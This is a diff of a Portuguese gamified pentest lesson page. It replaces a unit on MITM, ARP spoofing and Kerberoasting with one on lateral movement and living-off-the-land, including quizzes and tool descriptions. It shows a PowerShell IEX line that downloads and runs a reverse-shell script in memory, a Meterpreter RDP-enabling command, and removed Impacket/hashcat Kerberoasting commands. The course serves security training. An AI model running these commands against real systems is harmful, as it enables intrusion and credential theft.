@@ -9,14 +9,14 @@
     <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <title>CyberDuo - Exploração de Protocolos e Ataques de Senha</title>
+    <title>CyberDuo - Movimento Lateral e Living off the Land</title>
     <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
     <link rel="stylesheet" href="../assets/tailwind.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --cyber-blue: #ff8c00;
+            --cyber-blue: #ff003c;
             --cyber-green: #00ff41;
             --cyber-red: #ff003c;
             --cyber-yellow: #ffb800;
@@ -95,8 +95,8 @@
         .game-footer { flex-shrink: 0; padding: 1rem 1rem max(1rem, env(safe-area-inset-bottom)); background: #0d1117; border-top: 1px solid #1f2937; width: 100%; display: flex; justify-content: center; box-sizing: border-box; z-index: 50; }
         .check-btn { width: 100%; max-width: 400px; padding: 1rem; border-radius: 1rem; font-weight: 800; text-transform: uppercase; cursor: pointer; background: #1f2937; color: #4b5563; border: none; font-size: 1rem; letter-spacing: 1px; transition: all 0.1s; -webkit-tap-highlight-color: transparent; }
         .check-btn:active { transform: scale(0.98); }
-        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #b36200; }
-        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #b36200; }
+        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #b3002a; }
+        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #b3002a; }
 
         /* FEEDBACK OVERLAY */
         .feedback-overlay { position: fixed; bottom: -100%; left: 0; right: 0; padding: 1.5rem 1.5rem max(1.5rem, env(safe-area-inset-bottom)); transition: bottom 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); z-index: 100; border-top-left-radius: 1.5rem; border-top-right-radius: 1.5rem; display: flex; flex-direction: column; align-items: center; text-align: left; }
@@ -110,7 +110,7 @@
 <body>
 
     <div class="game-header">
-        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-05.html'"><i class="fas fa-times"></i></div>
+        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-08.html'"><i class="fas fa-times"></i></div>
         <div class="progress-container"><div class="progress-fill" id="progressFill"></div></div>
         <div class="hearts" id="heartsContainer"></div>
     </div>
@@ -131,227 +131,129 @@
         const steps = [
             {
                         "type": "teach",
+                        "icon": "fa-arrows-left-right",
+                        "title": "O que é Movimento Lateral? (Cisco 8.2.1)",
+                        "content": "O <b>Movimento Lateral</b> (também chamado de <b>Pivotagem / Pivoting</b>) é o ato de usar o primeiro sistema comprometido como um trampolim para atacar outras máquinas na rede interna corporativa.<br><br>O objetivo principal é evitar a detecção, mapear o ambiente e obter acesso a <b>dados confidenciais</b>. O processo de transferir esses dados do interior para fora do perímetro da organização de forma oculta é a <b>Exfiltração de Dados</b>.",
+                        "highlight": "A primeira máquina invadida raramente é o alvo final. Ela serve para pivotar até o objetivo."
+            },
+            {
+                        "type": "teach",
                         "icon": "fa-network-wired",
-                        "title": "Fundamentos de Redes: MAC vs IP",
-                        "content": "Antes de explorar as falhas, precisamos entender como as redes se comunicam. Cada dispositivo possui duas identificações principais:<br><br>1. <b>Endereço MAC (Camada 2 - Link de Dados)</b>: Identificador físico permanente e exclusivo de 48 bits gravado na placa de rede de fábrica. Usado para a comunicação direta na rede local.<br>2. <b>Endereço IP (Camada 3 - Rede)</b>: Identificador lógico associado ao dispositivo para permitir o roteamento e a comunicação através de diferentes redes (ex: internet)."
+                        "title": "Estratégia de Segmentação de Rede (Cisco 8.2.2)",
+                        "content": "O movimento lateral só é possível se o cliente não possuir uma estratégia adequada de <b>Segmentação de Rede</b>.<br><br>🛡️ Para proteger a organização, utilizam-se firewalls internos, VLANs (redes locais virtuais) ou microsegmentação em ambientes virtualizados e containerizados. Testar a eficácia dessa segmentação de rede de forma frequente é vital no pentest.",
+                        "highlight": "VLANs e firewalls internos bem configurados restringem a movimentação lateral do atacante."
             },
             {
-                        "type": "teach",
-                        "icon": "fa-route",
-                        "title": "Transporte de Dados: TCP vs UDP",
-                        "content": "Os dados trafegam pela rede utilizando protocolos de transporte:<br><br>1. <b>TCP (Transmission Control Protocol)</b>: Focado em confiabilidade. Realiza uma conexão (handshake de 3 vias) antes de enviar dados, garante que todos os pacotes cheguem e corrige erros. Ex: HTTP, SSH, FTP.<br>2. <b>UDP (User Datagram Protocol)</b>: Focado em velocidade. Envia pacotes sem estabelecer conexão prévia e sem garantir que chegarão ao destino. Ex: DNS, DHCP, VoIP."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-server",
-                        "title": "DHCP e Roteamento",
-                        "content": "Como os IPs se organizam?<br><br>• <b>DHCP (Dynamic Host Configuration Protocol)</b>: O protocolo da Camada de Aplicação que distribui configurações de rede (IP, máscara de sub-rede, gateway) automaticamente para os dispositivos que entram na rede local.<br>• <b>Roteamento</b>: Processo realizado por roteadores que encaminham os pacotes entre redes distintas com base na tabela de roteamento e no IP de destino."
+                        "type": "example",
+                        "icon": "fa-terminal",
+                        "title": "Prática - Habilitando RDP via Metasploit (Cisco 8.2.2)",
+                        "scenario": "Para obter controle visual do sistema Windows invadido a partir do Meterpreter, o testador utiliza o módulo de pós-exploração para ativar o serviço de RDP (Remote Desktop) e configurar permissões de firewall:",
+                        "code": "meterpreter > run post/windows/manage/enable_rdp\n[*] Enabling Remote Desktop Service...\n[*] Opening RDP Port in Windows Firewall...\n[+] Service enabled successfully!",
+                        "takeaway": "O RDP oferece uma interface gráfica completa criptografada, o que oculta o que você faz dos sensores de tráfego de rede."
             },
             {
                         "type": "quiz",
-                        "task": "Qual das alternativas descreve corretamente uma característica do protocolo UDP?",
+                        "task": "Qual é a principal desvantagem ou risco de se utilizar conexões de Área de Trabalho Remota (RDP) para se mover lateralmente durante um engajamento?",
                         "options": [
-                                    "Ele não é orientado a conexão e prioriza a velocidade do envio, sem garantir que os pacotes cheguem ao destino.",
-                                    "Ele realiza o handshake de 3 vias antes de iniciar a transmissão.",
-                                    "Ele só funciona na camada física de links de dados (Camada 1)."
+                                    "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
+                                    "As conexões RDP não oferecem interface gráfica (GUI), limitando as ações a comandos CMD brutos.",
+                                    "O tráfego de rede RDP não aceita criptografia, permitindo que firewalls descubram senhas na rede facilmente."
                         ],
-                        "correctText": "Ele não é orientado a conexão e prioriza a velocidade do envio, sem garantir que os pacotes cheguem ao destino.",
-                        "explanation": "O UDP prioriza o tempo real e a velocidade de entrega sobre a integridade/garantia da conexão, ideal para DNS, DHCP e streams."
+                        "correctText": "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
+                        "explanation": "No Windows clássico de desktop, conectar via RDP derruba a sessão do usuário ativo ou exige autorização visual dele, expondo o atacante na hora."
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-ghost",
+                        "title": "Living off the Land e Malware Sem Arquivo (Cisco 8.2.3)",
+                        "content": "Instalar binários maliciosos ou vírus no disco da vítima é barulhento e facilmente bloqueado pelo antivírus. Os atacantes preferem o <b>Living-off-the-Land (LOLBins)</b>.<br><br>Essa técnica (frequentemente chamada de <b>malware sem arquivo / fileless</b>) usa utilitários e comandos legítimos e nativos do próprio sistema operacional (como PowerShell, WMI, WinRM e PsExec) para executar tarefas maliciosas.",
+                        "highlight": "LOLBins usam a própria 'lei' do sistema contra ele, agindo na memória sem salvar arquivos em disco!"
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-terminal",
+                        "title": "Prática - Execução In-Memory com PowerShell (Cisco 8.2.3)",
+                        "scenario": "Para executar um script de backdoor sem baixar nenhum executável ou arquivo no HD da vítima, o atacante usa a diretiva IEX para baixar e rodar o script diretamente na memória RAM:",
+                        "code": "PS > IEX (New-Object Net.WebClient).DownloadString('http://10.1.2.3/Invoke-PowerShellTcp.ps1')",
+                        "takeaway": "Como o arquivo PS1 roda direto na memória RAM, a análise de disco estática do antivírus não detecta a execução."
             },
             {
                         "type": "match",
-                        "title": "Associe os Conceitos de Redes",
+                        "title": "Comandos PowerShell na Pós-Exploração (Cisco Tabela 8-4)",
                         "pairs": [
                                     {
-                                                "term": "MAC Address",
-                                                "definition": "Identificador físico permanente (Camada 2)"
+                                                "term": "Select-String",
+                                                "definition": "Localiza textos (como senhas) dentro de arquivos de diretórios"
                                     },
                                     {
-                                                "term": "IP Address",
-                                                "definition": "Endereço lógico de rede (Camada 3)"
+                                                "term": "Get-HotFix",
+                                                "definition": "Obtém a listagem completa de correções e patches do S.O."
                                     },
                                     {
-                                                "term": "TCP",
-                                                "definition": "Conexão confiável via Handshake"
+                                                "term": "Get-Process",
+                                                "definition": "Lista todos os processos ativos em execução no sistema"
                                     },
                                     {
-                                                "term": "DHCP",
-                                                "definition": "Distribuição dinâmica de IPs locais"
+                                                "term": "DownloadFile",
+                                                "definition": "Busca e baixa arquivos via HTTP similar ao utilitário wget do Linux"
                                     }
                         ]
             },
             {
                         "type": "teach",
-                        "icon": "fa-users",
-                        "title": "Man-in-the-Middle (MITM)",
-                        "content": "No ataque <b>MITM</b>, o hacker se posiciona invisivelmente entre a vítima e o roteador (ou servidor). Todo o tráfego de rede passa pelo computador do hacker antes de chegar ao destino."
-            },
-            {
-                        "type": "example",
-                        "icon": "fa-eye",
-                        "title": "Interceptação de Tráfego",
-                        "scenario": "A vítima entra em um site HTTP para comprar um produto. Como o tráfego passa pelo computador do atacante, ele lê o número do cartão de crédito em texto puro usando o Wireshark.",
-                        "takeaway": "Sem criptografia ponta-a-ponta, a rede local não é confiável."
+                        "icon": "fa-folder-open",
+                        "title": "PowerSploit, Empire e BloodHound (Cisco 8.2.3)",
+                        "content": "A pós-exploração corporativa conta com arsenais potentes baseados em PowerShell:<br><br>🛠️ <b>PowerSploit</b>: Módulos como `Invoke-Mimikatz` (carrega Mimikatz 2.0 refletivamente na RAM para extrair senhas do LSASS) e `Invoke-NinjaCopy` (copia arquivos de volumes NTFS brutos contornando travas do S.O.).<br><br>👑 <b>Empire</b>: Framework C2 open source que roda agentes PowerShell de forma evasiva.<br><br>🩸 <b>BloodHound</b>: Software JS de página única que usa <b>Teoria dos Grafos</b> para mapear relacionamentos do Active Directory e revelar caminhos ocultos de ataque."
             },
             {
                         "type": "quiz",
-                        "task": "No ataque MITM, qual é o principal objetivo do atacante?",
+                        "task": "Qual framework C2 de código aberto permite executar agentes e payloads pós-exploração em máquinas Windows e Linux sem a necessidade do powershell.exe?",
                         "options": [
-                                    "Interceptar e manipular a comunicação entre duas partes sem que elas saibam.",
-                                    "Derrubar o servidor com múltiplas requisições simultâneas.",
-                                    "Adivinhar a senha do Wi-Fi."
+                                    "Empire",
+                                    "Nmap",
+                                    "Ettercap"
                         ],
-                        "correctText": "Interceptar e manipular a comunicação entre duas partes sem que elas saibam.",
-                        "explanation": "Ele vira um intermediário silencioso e malicioso."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-network-wired",
-                        "title": "ARP Spoofing",
-                        "content": "A técnica mais comum de MITM em redes locais é o <b>ARP Spoofing</b>. O hacker envia pacotes ARP falsos dizendo para a máquina da vítima: 'Eu sou o roteador'. E diz para o roteador: 'Eu sou a vítima'."
-            },
-            {
-                        "type": "example",
-                        "icon": "fa-terminal",
-                        "title": "Enganando o Switch",
-                        "scenario": "O PC do João quer ir para a internet. Mas o atacante 'envenenou' a tabela ARP do João. Agora, o PC do João manda os dados para o hacker achando que é o roteador.",
-                        "takeaway": "O protocolo ARP não possui autenticação nativa."
-            },
-            {
-                        "type": "fill",
-                        "sentence": "Para se defender de ataques de ___ Spoofing, empresas configuram 'Dynamic ARP Inspection' (DAI) em seus switches Cisco.",
-                        "options": [
-                                    "ARP",
-                                    "DNS",
-                                    "IP"
-                        ],
-                        "correctText": "ARP",
-                        "explanation": "O DAI impede que máquinas enviem respostas ARP fraudulentas na rede."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-volume-high",
-                        "title": "O que é LLMNR?",
-                        "content": "Quando um PC Windows não consegue resolver um nome via DNS, ele 'grita' na rede local usando <b>LLMNR</b> ou <b>NBT-NS</b> perguntando se alguém conhece aquele nome.",
-                        "highlight": "Protocolo de broadcast local, altamente inseguro."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-skull",
-                        "title": "Poisoning (Envenenamento)",
-                        "content": "O atacante ouve o grito e responde: 'Eu sou esse servidor! Me mande suas credenciais para autenticar'. A vítima envia seu hash NTLMv2.",
-                        "highlight": "O atacante mente para capturar o hash da vítima."
-            },
-            {
-                        "type": "example",
-                        "icon": "fa-terminal",
-                        "title": "Responder",
-                        "scenario": "Usando a ferramenta `Responder`, o atacante fica passivamente na rede. Quando alguém digita errado o nome de uma pasta da rede (`\\\\servidro` em vez de `\\\\servidor`), o Responder captura a credencial.",
-                        "takeaway": "Desabilite LLMNR e NBT-NS no Active Directory via GPO."
-            },
-            {
-                        "type": "fill",
-                        "sentence": "Ao capturar as credenciais através do Responder, o atacante obtém um ___, que precisa ser quebrado usando ferramentas como Hashcat.",
-                        "options": [
-                                    "Hash NTLMv2",
-                                    "Cookie",
-                                    "Token JWT"
-                        ],
-                        "correctText": "Hash NTLMv2",
-                        "explanation": "O Windows usa o protocolo NTLMv2 em redes locais, que não envia senhas em texto puro."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-key",
-                        "title": "Brute Force e Dictionary",
-                        "content": "<b>Brute Force</b>: testa TODAS as combinações. <b>Dictionary</b>: testa palavras de uma lista. <b>Hybrid</b>: combina dicionário + regras (ex: Password1!, Password2!).",
-                        "highlight": "Dicionário é mais rápido, brute force é mais completo"
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-unlock",
-                        "title": "Pass-the-Hash",
-                        "content": "No <b>Pass-the-Hash</b>, o atacante usa o hash NTLM capturado para autenticar em serviços Windows <b>sem precisar da senha em texto claro</b>. Funciona com <b>psexec</b> e <b>wmiexec</b>.",
-                        "highlight": "Hash NTLM = equivalente à senha no Windows"
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-ticket",
-                        "title": "Kerberoasting",
-                        "content": "<b>Kerberoasting</b>: solicita tickets Kerberos TGS para contas de serviço e tenta crackar offline. Contas de serviço frequentemente têm senhas fracas e privilégios altos.",
-                        "highlight": "Service accounts = alvo fácil com alto impacto"
-            },
-            {
-                        "type": "example",
-                        "icon": "fa-terminal",
-                        "title": "Kerberoasting com Impacket",
-                        "scenario": "O pentester solicita tickets TGS para todas as contas de serviço do AD e tenta crackar com Hashcat.",
-                        "code": "GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -outputfile tgs.txt\nhashcat -m 13100 tgs.txt rockyou.txt",
-                        "takeaway": "Kerberoasting não requer privilégios elevados no AD."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-id-card",
-                        "title": "AS-REP Roasting",
-                        "content": "<b>AS-REP Roasting</b>: explora contas com <b>Kerberos pre-auth desabilitado</b>. O atacante solicita o AS-REP e cracka offline sem precisar de credenciais válidas.",
-                        "highlight": "Pre-auth desabilitado = senha crackável sem login"
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-database",
-                        "title": "Credential Stuffing",
-                        "content": "<b>Credential Stuffing</b>: usa pares <b>email:senha</b> de vazamentos (breaches) para tentar login em outros serviços. 65% das pessoas reutilizam senhas.",
-                        "highlight": "Reutilização de senhas = porta aberta"
-            },
-            {
-                        "type": "quiz",
-                        "task": "Qual ataque solicita tickets Kerberos TGS para crackar senhas de service accounts offline?",
-                        "options": [
-                                    "Kerberoasting",
-                                    "Phishing",
-                                    "ARP Spoofing"
-                        ],
-                        "correctText": "Kerberoasting",
-                        "explanation": "Kerberoasting explora contas de serviço com SPNs registrados no Active Directory."
+                        "correctText": "Empire",
+                        "explanation": "O Empire provê agentes muito eficientes baseados em PowerShell para Windows e Python para Linux, focados em modularidade e evasão."
             },
             {
                         "type": "match",
-                        "title": "Ataque → Requisito",
+                        "title": "Conjunto de Ferramentas Sysinternals (Cisco 8.2.3)",
                         "pairs": [
                                     {
-                                                "term": "Pass-the-Hash",
-                                                "definition": "Hash NTLM capturado"
+                                                "term": "PsExec",
+                                                "definition": "Executa remotamente e exibe as saídas de comandos no terminal local"
                                     },
                                     {
-                                                "term": "Kerberoasting",
-                                                "definition": "Acesso ao AD (qualquer user)"
+                                                "term": "PsGetSid",
+                                                "definition": "Exibe os identificadores de segurança (SIDs) dos usuários"
                                     },
                                     {
-                                                "term": "AS-REP Roasting",
-                                                "definition": "Pre-auth desabilitado"
+                                                "term": "PsLoggedOn",
+                                                "definition": "Lista contas de usuários conectadas ativamente no host"
                                     },
                                     {
-                                                "term": "Credential Stuffing",
-                                                "definition": "Lista de credenciais vazadas"
+                                                "term": "PsFile",
+                                                "definition": "Exibe a lista de arquivos abertos e compartilhados do sistema"
                                     }
                         ]
             },
             {
                         "type": "fill",
-                        "sentence": "O ataque que explora contas com Kerberos pre-authentication desabilitado é o ___.",
+                        "sentence": "Para habilitar o gerenciamento remoto nativo (PS remoting / WinRM) do Windows e abrir o firewall para receber conexões de outros sistemas na rede, rodamos Enable-___. (-SkipNetworkProfileCheck -Force)",
                         "options": [
-                                    "AS-REP Roasting",
-                                    "Kerberoasting",
-                                    "Pass-the-Hash"
+                                    "PSRemoting",
+                                    "Process",
+                                    "Service"
                         ],
-                        "correctText": "AS-REP Roasting",
-                        "explanation": "AS-REP Roasting funciona sem credenciais si a pre-auth estiver desabilitada."
+                        "correctText": "PSRemoting",
+                        "explanation": "O cmdlet Enable-PSRemoting configura o WinRM para aceitar conexões administrativas remotas via PowerShell."
             }
 ];
 
         let currentStep = 0;
         let selectedIdx = null; // For quiz and fill
-        let hearts = 7;
+        let hearts = 5;
         let shuffledOptions = [];
         
         // Match state
@@ -376,7 +278,7 @@
             document.getElementById('progressFill').style.width = `${progress}%`;
             
             const container = document.getElementById('heartsContainer');
-            container.innerHTML = Array(7).fill(0).map((_, i) => `<i class="${i < hearts ? 'fas' : 'far'} fa-heart"></i>`).join('');
+            container.innerHTML = Array(5).fill(0).map((_, i) => `<i class="${i < hearts ? 'fas' : 'far'} fa-heart"></i>`).join('');
         }
 
         function render() {
@@ -627,15 +529,15 @@
             document.getElementById('progressFill').style.width = `100%`;
             document.getElementById('footerArea').classList.add('hidden');
             
-            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/5.2-wireless.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/8.2b-escalada-limpeza.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             if (nextBtnHtml.includes("##NEXT_LESSON_BTN" + "##")) {
-                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #b36200; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #b3002a; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             }
 
             document.getElementById('gameArea').innerHTML = `
                 <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
                     <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
-                    <h2 class="title-main mb-2">Você concluiu esta lição e dominou os conceitos apresentados.</h2>
+                    <h2 class="title-main mb-2">Você aprendeu a saltar entre sistemas com pivotagem, usar utilitários legítimos (LOLBins) e varrer mídias e AD com BloodHound e Sysinternals!</h2>
                     <p class="text-body mb-6">Você completou esta lição com sucesso!</p>
                     <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                         ${nextBtnHtml}
@@ -644,7 +546,7 @@
                                 <i class="fas fa-rotate-right mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">REINICIAR</span>
                             </button>
-                            <button class="check-btn" onclick="window.location.href='../modules/modulo-05.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
+                            <button class="check-btn" onclick="window.location.href='../modules/modulo-08.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
                                 <i class="fas fa-layer-group mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">MÓDULOS</span>
                             </button>
